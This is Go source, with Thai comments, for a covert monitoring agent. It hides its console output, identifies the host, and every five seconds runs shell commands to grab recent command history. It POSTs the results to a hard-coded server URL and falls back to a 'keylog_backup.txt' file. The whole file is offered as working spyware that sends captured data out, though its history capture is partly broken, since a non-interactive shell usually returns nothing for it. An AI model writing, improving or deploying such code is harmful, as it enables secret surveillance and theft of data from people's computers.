package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// <<< แก้ URL นี้ให้เป็น IP ของ Server คุณ >>>
const serverURL = "http://192.168.0.104:8080/stream" 

func sendLog(data []byte) {
	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer(data))
	if err != nil {
		// ถ้าเน็ตไม่เข้า ให้บันทึกลงไฟล์แทน
		os.WriteFile("keylog_backup.txt", data, 0644)
	} else {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func runCommand(cmd string) string {
	c := exec.Command("sh", "-c", cmd) 
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	}
	out, _ := c.CombinedOutput()
	return string(out)
}

func main() {
	log.SetOutput(io.Discard) // ซ่อน Log Console
	
	id := "host-" + os.Getenv("COMPUTERNAME")
	if id == "host-" {
		id = "host-" + os.Getenv("HOSTNAME")
	}
	
	// ส่งข้อมูลเริ่มต้น
	info := fmt.Sprintf("[INIT] Started on %s | PID: %d | OS: %s\n", id, os.Getpid(), runtime.GOOS)
	sendLog([]byte(info))

	// Loop Capture ทุก 5 วินาที
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// จับ Command ที่เคยรันล่าสุด
			cmd := "history | tail -n 5"
			if runtime.GOOS == "windows" {
				cmd = "doskey /history"
			}
			
			output := runCommand(cmd)
			if output != "" {
				sendLog([]byte(fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), output)))
			}
		}
	}
}
